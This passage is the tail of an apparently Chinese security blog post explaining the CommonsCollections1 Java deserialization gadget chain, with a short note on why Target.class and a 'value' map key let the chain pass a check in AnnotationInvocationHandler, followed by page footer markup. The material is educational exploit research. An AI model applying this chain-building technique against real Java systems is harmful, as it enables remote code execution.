+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142111136.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142111136.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142111136.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142111136.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142111136.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142111136.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="注" class="heading-element">
+  <a href="#%e6%b3%a8" class="heading-mark"></a>注</h3><p>这里为什么要用<code>Target</code>
+<code>Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</code>
+因为<code>Target</code>中有值是<code>value</code></p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142103316.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142103316.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142103316.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142103316.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142103316.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142103316.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里的<code>getKey()</code>获取的就是，上面<code>map.put()</code>放入的<code>key</code>值</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><code>map.put(&quot;value&quot;,&quot;value&quot;);</code>
+<code>key</code>放入<code>value</code>，正好能取出<code>Target</code>中的值，所以就绕过了<code>if</code>条件</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-01-14 23:37:48">Updated on 2024-01-14&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/" data-title="CommonsCollections1链详解"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/commonscollections/" class="post-tag" title="Tags - CommonsCollections">CommonsCollections</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/" class="post-nav-item" rel="prev" title="URLDNS链详解"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>URLDNS链详解</a>
+      <a href="/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="post-nav-item" rel="next" title="ThinkPHP3.2.3漏洞学习">ThinkPHP3.2.3漏洞学习<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.121.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.1"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright order-5" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider">Web Security</span></div><div class="footer-line statistics"><span class="site-time" title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">Website running ...</span></span></div><div class="footer-line visitor order-4">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":true},"siteTime":"2024-01-14T23:31:00+08:00"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
